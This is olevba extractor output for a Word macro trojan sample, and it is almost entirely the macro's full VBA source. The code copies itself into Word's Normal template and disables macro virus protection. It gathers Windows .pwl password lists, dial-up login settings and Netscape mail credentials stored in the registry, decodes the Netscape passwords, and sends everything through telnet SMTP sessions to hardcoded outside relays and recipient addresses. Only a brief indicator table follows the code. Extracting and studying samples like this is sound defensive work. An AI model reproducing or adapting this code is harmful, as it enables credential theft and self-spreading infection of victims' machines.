olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Npr.b-2762b6dd9b482d5b63180ecf28fd02d18da02de6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Npr.b-2762b6dd9b482d5b63180ecf28fd02d18da02de6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPluss.bas 
in file: Trojan.MSWord.Npr.b-2762b6dd9b482d5b63180ecf28fd02d18da02de6 - OLE stream: 'Macros/VBA/MSPluss'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NetscapePasswordReminder
Option Explicit
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "NetscapePasswordReminder", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Body = morf(Body)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPluss"
     End If
   Next
 End Sub
Function Random1(i As Integer)
Dim Resalt As Integer
Resalt = Int(i * Rnd + 1)
Random1 = Resalt
End Function
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub
Function Revers(MyString As String)
 Dim Temp As String, i As Long
 For i = 1 To Len(MyString)
  Temp = Temp + Mid$(MyString, Len(MyString) + 1 - i, 1)
 Next
 Revers = Temp
End Function
' End Sub
Function Decode_(Cod As String)
Dim i As Long
Dim AlfaBet As String
Dim Chop As Integer
Dim HiMask As Integer
Dim LowMask As Integer
Dim HiShift As Integer
Dim LowShift As Integer
Dim Charset As Integer
Dim First As Integer, Second As Integer
Dim Resalt As String
If Cod = "" Then
 Decode_ = ""
 Exit Function
End If
AlfaBet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Chop = 63
HiMask = 63
LowMask = 0
HiShift = 4
LowShift = 64
Resalt = ""
For i = 1 To Len(Cod)
 Charset = InStr(1, AlfaBet, Mid(Cod, i, 1), vbBinaryCompare) - 1
If Charset >= 0 Then
Second = (Charset And LowMask) / LowShift
If HiMask <> 63 Then
 Resalt = Resalt + Chr$(First + Second)
End If
First = (Charset And HiMask) * HiShift
If HiMask = 0 Then
 HiMask = 63
 LowMask = 0
 HiShift = 4
 LowShift = 64
Else
 HiMask = ((HiMask * 4) And HiMask) / 4
 LowMask = 63 Xor HiMask
 HiShift = HiShift * 4
 LowShift = LowShift / 4
End If
End If
Next
Decode_ = Resalt
End Function
' End Sub
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
' End Sub
Function Grab_Registr_main()
Dim res As Long, hkey As Long, i As Long
Dim KeyName As String, KeyLen As Long
Dim ClassName As String, ClassLen As Long
Dim lastwrite As FILETIME
Dim res1 As Long, hkey1 As Long, n As Long
Dim KeyName1 As String, KeyLen1 As Long
Dim ClassName1 As String, ClassLen1 As Long
Dim lastwrite1 As FILETIME
Dim userName As String
Dim PassWord As String
Dim Resalt As String
Dim Version As String
Dim j As Long
On Error Resume Next
Resalt = "" + Chr(10) + Chr(13)
res = RegOpenKeyEx(&H80000001, "Software\Netscape\Netscape Navigator\biff\users\", 0, &H8, hkey)
If res <> 0 Then
 Resalt = "Íà ìàøèíå íå óñòàíîâëåíà ïð. Netscape Navigator (èëè íåïîääåðæèâàåìàÿ âåðñèÿ)."
 Grab_Registr_main = Resalt
 Exit Function
End If
i = 0
Do While res = 0
 KeyName = Space(255): ClassName = Space(255)
 KeyLen = 255: ClassLen = 255
 res = RegEnumKeyEx(hkey, i, KeyName, KeyLen, ByVal 0, ClassName, ClassLen, lastwrite)
If res = 0 Then
 KeyName = Left(KeyName, KeyLen)
 ClassName = Left(ClassName, ClassLen)
 
 res1 = RegOpenKeyEx(&H80000001, "Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\", 0, &H8, hkey1)
n = 0
Do While res1 = 0
 KeyName1 = Space(255): ClassName1 = Space(255)
 KeyLen1 = 255: ClassLen1 = 255  '
 res1 = RegEnumKeyEx(hkey1, n, KeyName1, KeyLen1, ByVal 0, ClassName1, ClassLen1, lastwrite1)
If res1 = 0 Then
 KeyName1 = Left(KeyName1, KeyLen1)
 ClassName1 = Left(ClassName1, ClassLen1)
 userName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\" + KeyName1, "userName")
 PassWord = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\" + KeyName1, "password")
 Resalt = Resalt + "Ïîëüçîâàòåëü: " + KeyName + _
 Chr(13) + "POP3-ñåðâåð: " + KeyName1 + Chr(13) _
 + "Èìÿ Àêêàóíòà äëÿ POP3-ñåðâåðà: " + userName + Chr(13) _
 + Decode_Password(PassWord) + Chr(10) + Chr(13)
End If
n = n + 1
 Loop
 res1 = RegCloseKey(hkey1)
End If
i = i + 1
j = j + n - 1
DoEvents
Loop
res = RegCloseKey(hkey)
Version = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator", "CurrentVersion")
Resalt = "*ïðîãðàììà òåñòèðîâàíà òîëüêî äëÿ âåðñèè Netscape Navigator 4.51(ru)*" + Chr(10) + Chr(13) + "Ó Âàñ Netscape Navigator - " + Version + Chr(13) + "Ïîëüçîâàòåëåé - " + Str(i - 1) + Chr(13) + "Ïî÷òîâûõ Àêêàóíòîâ - " + Str(j - 1) + Resalt
Grab_Registr_main = Resalt
End Function
' End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Function Base64(FName As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim Counter As Long
'
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer
Dim NF As Integer


HMask = 252
LMask = 3
Shift = 16
Roll = 0
Counter = 1
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
NF = FreeFile
On Error Resume Next
Open "c:\windows\" + FName For Binary Access Read As #NF
For i = 1 To LOF(NF)
Get #NF, Counter, Char
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Counter = Counter + 1
Next
Close #NF
If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
' End Sub
Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Function ROT_13(Cod As String)
Dim La As String
Dim Smol As String
Dim i As Integer
Dim n As Integer
Dim Char As String
Dim ChNumber As Integer
Dim Tmp As String
La = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Smol = "abcdefghijklmnopqrstuvwxyz"
For i = 1 To Len(Cod)
Char = Mid(Cod, i, 1)
ChNumber = InStr(1, La, Char, vbBinaryCompare)
Select Case ChNumber
 Case 1 To 13
 Tmp = Tmp + Mid(La, ChNumber + 13, 1)
 Case Is > 13
 Tmp = Tmp + Mid(La, ChNumber - 13, 1)
 Case Else
  ChNumber = InStr(1, Smol, Char, vbBinaryCompare)
  Select Case ChNumber
   Case 1 To 13
   Tmp = Tmp + Mid(Smol, ChNumber + 13, 1)
   Case Is > 13
   Tmp = Tmp + Mid(Smol, ChNumber - 13, 1)
   Case Else
   Tmp = Tmp + Char
   End Select
End Select
Next
ROT_13 = Tmp
End Function
' End Sub
Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub
Function morf(MyString As String)
Dim NextSub As Long
Dim Counter As Integer
Dim A() As Integer
Dim Code_() As String
Dim i As Long
Dim Pre_ As Long
Dim Resalt As String
On Error Resume Next
NextSub = InStr(1, MyString, "End" + " Sub", vbTextCompare)
Do While NextSub <> 0
Counter = Counter + 1
NextSub = InStr(NextSub + 9, MyString, "End" + " Sub", vbTextCompare)
Loop
ReDim Code_(0 To Counter - 1)

NextSub = -8
For i = 0 To Counter - 1
Pre_ = NextSub + 9
NextSub = InStr(Pre_, MyString, "End" + " Sub", vbTextCompare)
Code_(i) = Mid(MyString, Pre_, NextSub + 9 - Pre_)
Next i
Loto Counter - 1, A()
Resalt = Code_(0)
For i = 1 To Counter - 1
Resalt = Resalt + Code_(A(i))
Next i
morf = Resalt
End Function
' End Sub
Function Decode_Password(Cod As String)
Dim Key As Variant
Dim i As Integer
Dim n As Integer
Dim Title As String
If Cod = "" Then
 Title = "Äàííûé ïîëüçîâàòåëü íå óñòàíîâèë ôëàæîê " + Chr(34) + "Çàïîìíèòü ïàðîëü" + Chr(34)
 Decode_Password = Title
Exit Function
End If
Key = Array(86, 201, 239, 74, 155, 190, 90, 66, 119, 2, 67, 24, 112, 48, 137, 76)
Cod = Revers(Cod)
Cod = ROT_13(Cod)
Cod = Decode_(Cod)
n = Len(Cod)
If n > 16 Then
 n = 16
 Title = "Ïåðâûå øåñòíàäöàòü ñèìâîëîâ ïàðîëÿ: "
Else
 Title = "Ïàðîëü: "
End If
For i = 1 To n
Title = Title + Chr(Asc(Mid(Cod, i, 1)) Xor Key(i - 1))
Next
Decode_Password = Title
End Function
' End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Sub AutoExec()
 AutoOpen
End Sub
Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub AutoExit()
Dim Counter As Long
Dim i As Long
Dim Yes As Boolean
Dim VBComponent As Object

On Error Resume Next
  Application.Visible = False
  Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPluss" Then
  Yes = True
 End If
 Next
 If Yes = False Then
  Counter = Templates.Count
 For i = 1 To Counter
  If InStr(1, Templates(i).FullName, "STARTUP", vbTextCompare) <> 0 Then
 Templates(i).OpenAsDocument
 CopyLines Templates(i)
 ActiveDocument.Close
 End If
 Next
 End If
 NormalTemplate.Save
 Tmsn
End Sub

Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "Ïîäêëþ÷åíî ê", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function
' End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
 On Error Resume Next
ActiveDocument.ShowSpellingErrors = False
ActiveDocument.ShowGrammaticalErrors = False
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPluss" Then
  Yes = True
 End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub
Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub

Function Grab(Name As String)
Dim Tmp As String
Dim AZ As String
Dim i As Integer
Dim Num As Integer
Dim PwdLst As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
Dim NF1 As Integer
AZ = "abcdifghijklmnopqastuvwxyz"
For i = 1 To 7
 Num = Random1(25)
 Name = Name + Mid(AZ, Num + 1, 1)
Next
Name = Name + ".egn"
On Error Resume Next
NF1 = FreeFile
Open "c:\windows\" + Name For Output Access Write As #NF1
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Print #NF1, Tmp
  End If
Loop
Close #NF
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Temp
 Counter = Counter + 1
 If Temp = "[Password Lists]" Then
  Do While Temp <> ""
  Line Input #NF, Temp
  PwdLst = PwdLst + Chr(10) + Temp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Print #NF1, PwdLst
Print #NF1, Grab_Registr_main()
Close #NF1
End Function
' End Sub
Sub Sender_main()
Dim Handle As Long
Dim HandleBW As Long
Dim hwnd As Long
Dim FileName As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 14) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim Kashek As String
Dim RecipientOfMessage_ As String
Dim FNum_ As Integer
Dim Kashelek As String
On Error Resume Next
If Check_Connection = True Then
Kashek = "cmNwdCB0bzogPHNvcmRvbmdAbWFpbC5jb20+"
RecipientOfMessage_ = "<vasya@zoo.kl>"
Host(1) = "ns1.kazna.com"
Host(2) = "mail.iname.com"
Host(3) = "194.186.182.26"
Host(4) = "195.75.32.20"
Host(5) = "lily.bas-net.by"
Host(6) = "212.19.17.57"
Host(7) = "itk2.bas-net.by"
Host(8) = "imaph2.bas-net.by"
Host(9) = "tuna.fsr.com"
Host(10) = "redfish.fsr.com"
Host(11) = "tixi.sakha.ru"
Host(12) = "ns.sovintel.ru"
Host(13) = "jupiter.zetcom.ru"
Host(14) = "nts_future.future.ru"
Loto 14, A()
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
  If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
   Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
   Twnd = "Òåëíåò"
    None = "(íåò)"
    Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
   Twnd = "telnet"
    None = "(íåò)"
  End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 5
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), "Connect failed")
 DoEvents
Loop
Select Case Handle
  Case Is <> 0
Kashelek = "Kashelek"
FNum_ = FreeFile
Open "c:\windows\" + Kashelek For Output Access Write As #FNum_
Print #FNum_, RecipientOfMessage_
Close #FNum_
SMTP = "helo My" + Base64(Kashelek) + "#$$mail from: <master@myself.com>#$" + Decode_(Kashek) + "#$rcpt to: " + RecipientOfMessage_ + "#$data#$Date: " + _
 Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
Kill "C:\Windows\Kashelek"
Grab FileName
SMTP = Base64(FileName)
Kill "c:\windows\" + FileName
SMTP = Adapt(SMTP)
Filler SMTP, Handle
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#$quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
' End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |194.186.182.26      |IPv4 address                                 |
|IOC       |195.75.32.20        |IPv4 address                                 |
|IOC       |212.19.17.57        |IPv4 address                                 |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|Base64    |rcpt to:            |cmNwdCB0bzogPHNvcmRvbmdAbWFpbC5jb20+         |
|String    |<sordong@mail.com>  |                                             |
+----------+--------------------+---------------------------------------------+

